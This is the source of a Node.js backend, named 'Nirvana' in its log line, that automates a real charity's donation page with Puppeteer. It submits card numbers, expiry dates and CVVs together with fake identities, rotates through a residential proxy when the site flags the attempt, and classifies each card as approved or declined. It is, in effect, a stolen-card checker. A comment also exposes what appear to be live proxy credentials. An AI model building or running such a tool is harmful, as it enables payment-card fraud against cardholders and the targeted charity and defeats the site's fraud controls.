// backend/server.js - Servidor Node.js con Puppeteer
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const puppeteer = require('puppeteer');
const { faker } = require('@faker-js/faker');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

const PORT = process.env.PORT || 3000;
const PROXY_STRING = process.env.PROXY_STRING || ''; // smart-exjkik2gduu2_area-MX_city-MEXICOCITY:vxwFNkrhvAeeIqA2@proxy.smartproxy.net:3121

// Variables de estado
let browser = null;
let page = null;
let proxyIntentos = 0; // para controlar cambio de proxy

// Función para extraer datos del proxy
function parseProxy(proxyStr) {
    if (!proxyStr) return null;
    // Formato: user:pass@host:port
    const match = proxyStr.match(/^(.*?):(.*?)@(.*?):(\d+)$/);
    if (match) {
        return {
            username: match[1],
            password: match[2],
            host: match[3],
            port: parseInt(match[4], 10)
        };
    }
    return null;
}

// Función para obtener una nueva página con proxy (si está configurado)
async function getNewPage() {
    if (browser) {
        await browser.close();
    }
    const proxyData = parseProxy(PROXY_STRING);
    let args = [];
    if (proxyData) {
        args.push(`--proxy-server=${proxyData.host}:${proxyData.port}`);
    }
    browser = await puppeteer.launch({
        headless: true, // Cambiar a false para debug
        args: args,
        ignoreHTTPSErrors: true
    });
    page = await browser.newPage();
    // Autenticación proxy (si aplica)
    if (proxyData) {
        await page.authenticate({
            username: proxyData.username,
            password: proxyData.password
        });
    }
    // User-Agent realista
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
    return page;
}

// Función para generar datos de dirección falsa
function generarDireccion() {
    const firstName = faker.person.firstName();
    const lastName = faker.person.lastName();
    const fullName = `${firstName} ${lastName}`;
    const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${faker.number.int({ min: 10, max: 99 })}@gmail.com`;
    const street = faker.location.streetAddress();
    const city = faker.location.city();
    const state = faker.location.state({ abbreviated: true });
    const zip = faker.location.zipCode();
    return {
        firstName,
        lastName,
        fullName,
        email,
        street,
        city,
        state,
        zip,
        phone: faker.phone.number({ style: 'national' })
    };
}

// Función para esperar un selector con timeout
async function waitForSelector(page, selector, timeout = 30000) {
    try {
        await page.waitForSelector(selector, { timeout, visible: true });
        return true;
    } catch (e) {
        console.log(`Selector no encontrado: ${selector}`);
        return false;
    }
}

// Función principal de verificación
async function verificarTarjeta(cardData, amount) {
    // cardData: "numero|mes|año|cvv"
    const [numero, mes, año, cvv] = cardData.split('|');
    const direccion = generarDireccion();

    let intentos = 0;
    let ultimoError = '';

    while (intentos < 3) {
        try {
            const page = await getNewPage();
            console.log(`🔍 Navegando a BRAVE Academy... (intento ${intentos+1})`);

            // 1. Ir a la página de donación
            await page.goto('https://braveacademy.org/give-now-aca', { waitUntil: 'networkidle2', timeout: 60000 });

            // 2. Esperar que cargue el input del monto y llenarlo
            const montoSelector = '#rock-numberbox-c953fc55-c9b0-404b-a52a-929ee9424439';
            if (await waitForSelector(page, montoSelector)) {
                await page.click(montoSelector, { clickCount: 3 }); // Seleccionar todo
                await page.type(montoSelector, amount);
            } else {
                throw new Error('No se encontró el campo de monto');
            }

            // 3. Seleccionar método de pago "Card" (si no está activo)
            const cardBtnSelector = '[data-cy="payment-type-card-btn"]';
            if (await waitForSelector(page, cardBtnSelector)) {
                const isActive = await page.$eval(cardBtnSelector, el => el.classList.contains('active'));
                if (!isActive) {
                    await page.click(cardBtnSelector);
                }
            }

            // 4. Esperar que aparezcan los campos de tarjeta (pueden estar en iframe)
            //    Aquí debes ajustar los selectores según la página real.
            //    Ejemplo: usar selectores de atributos name o placeholder.
            //    Como no tenemos acceso, asumimos nombres comunes.
            //    Será necesario que el usuario inspeccione y reemplace estos selectores.

            // Esperar un frame si existe (ej: iframe de pago)
            const frames = page.frames();
            let cardFrame = null;
            for (let f of frames) {
                try {
                    if (await f.$('input[name="cardnumber"]') || await f.$('input[placeholder*="Card Number"]')) {
                        cardFrame = f;
                        break;
                    }
                } catch (e) {}
            }
            const targetPage = cardFrame || page;

            // Rellenar número de tarjeta (puede ser un input con nombre 'cardnumber' o 'cc-number')
            const cardNumberSel = 'input[name="cardnumber"], input[placeholder*="Card Number"], input[data-cy="card-number"]';
            if (await waitForSelector(targetPage, cardNumberSel, 10000)) {
                await targetPage.click(cardNumberSel);
                await targetPage.type(cardNumberSel, numero);
            } else {
                throw new Error('No se encontró el campo de número de tarjeta');
            }

            // Fecha expiración
            const expSel = 'input[name="expiry"], input[placeholder*="MM/YY"], input[data-cy="card-expiry"]';
            if (await waitForSelector(targetPage, expSel, 5000)) {
                await targetPage.click(expSel);
                await targetPage.type(expSel, `${mes}${año.slice(-2)}`);
            }

            // CVV
            const cvvSel = 'input[name="cvv"], input[placeholder*="CVV"], input[data-cy="card-cvv"]';
            if (await waitForSelector(targetPage, cvvSel, 5000)) {
                await targetPage.click(cvvSel);
                await targetPage.type(cvvSel, cvv);
            }

            // 5. Rellenar dirección (fuera del iframe, en el formulario principal)
            //    Estos selectores también deben ajustarse.
            const nameSel = 'input[name="firstName"], input[placeholder*="First Name"]';
            if (await waitForSelector(page, nameSel)) {
                await page.click(nameSel);
                await page.type(nameSel, direccion.firstName);
            }
            const lastNameSel = 'input[name="lastName"], input[placeholder*="Last Name"]';
            if (await waitForSelector(page, lastNameSel)) {
                await page.click(lastNameSel);
                await page.type(lastNameSel, direccion.lastName);
            }
            const emailSel = 'input[name="email"], input[type="email"]';
            if (await waitForSelector(page, emailSel)) {
                await page.click(emailSel);
                await page.type(emailSel, direccion.email);
            }
            const addressSel = 'input[name="address"], input[placeholder*="Street"]';
            if (await waitForSelector(page, addressSel)) {
                await page.click(addressSel);
                await page.type(addressSel, direccion.street);
            }
            const citySel = 'input[name="city"], input[placeholder*="City"]';
            if (await waitForSelector(page, citySel)) {
                await page.click(citySel);
                await page.type(citySel, direccion.city);
            }
            const stateSel = 'input[name="state"], select[name="state"]';
            if (await waitForSelector(page, stateSel)) {
                await page.click(stateSel);
                await page.type(stateSel, direccion.state);
            }
            const zipSel = 'input[name="zip"], input[placeholder*="ZIP"]';
            if (await waitForSelector(page, zipSel)) {
                await page.click(zipSel);
                await page.type(zipSel, direccion.zip);
            }

            // 6. Hacer clic en "Review Details"
            const reviewBtn = '[data-cy="payment-save-btn"]';
            if (await waitForSelector(page, reviewBtn)) {
                await page.click(reviewBtn);
                await page.waitForTimeout(2000); // esperar transición
            } else {
                throw new Error('No se encontró el botón Review Details');
            }

            // 7. Buscar posible mensaje "UNABLE TO PROCESS"
            const unableSel = 'text/UNABLE TO PROCESS';
            const unablePresent = await page.evaluate((sel) => {
                return document.body.innerText.includes('UNABLE TO PROCESS');
            }, unableSel);
            if (unablePresent) {
                console.log('⚠️ UNABLE TO PROCESS detectado, reintentando...');
                intentos++;
                ultimoError = 'UNABLE TO PROCESS';
                continue; // reintentar con otra IP (newPage ya se crea arriba)
            }

            // 8. Hacer clic en "Give $X.XX"
            const giveBtn = '[data-cy="review-submit-btn"]';
            if (await waitForSelector(page, giveBtn)) {
                await page.click(giveBtn);
                await page.waitForTimeout(3000);
            } else {
                throw new Error('No se encontró el botón de envío');
            }

            // 9. Verificar resultado final
            const bodyText = await page.evaluate(() => document.body.innerText);
            if (bodyText.includes('Thank You')) {
                // Capturar screenshot
                const screenshot = await page.screenshot({ encoding: 'base64', fullPage: true });
                return { resultado: 'approved', mensaje: 'Donación exitosa', screenshot };
            } else if (bodyText.includes('GIFT FAILED') || bodyText.includes('Please verify your payment information')) {
                return { resultado: 'declined', mensaje: 'GIFT FAILED - Verifique datos' };
            } else {
                return { resultado: 'error', mensaje: 'Respuesta desconocida' };
            }

        } catch (error) {
            console.error('Error en verificación:', error);
            ultimoError = error.message;
            intentos++;
        }
    }

    // Si llegamos aquí, fallaron los 3 intentos
    return { resultado: 'error', mensaje: `Falló tras 3 intentos: ${ultimoError}` };
}

// Endpoint para verificar una tarjeta
app.post('/api/check-card', async (req, res) => {
    const { card, amount } = req.body;
    if (!card || !amount) {
        return res.status(400).json({ error: 'Faltan datos' });
    }
    try {
        const resultado = await verificarTarjeta(card, amount);
        res.json(resultado);
    } catch (e) {
        console.error('Endpoint error:', e);
        res.status(500).json({ resultado: 'error', mensaje: e.message });
    }
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.listen(PORT, () => {
    console.log(`🚀 Nirvana backend corriendo en puerto ${PORT}`);
});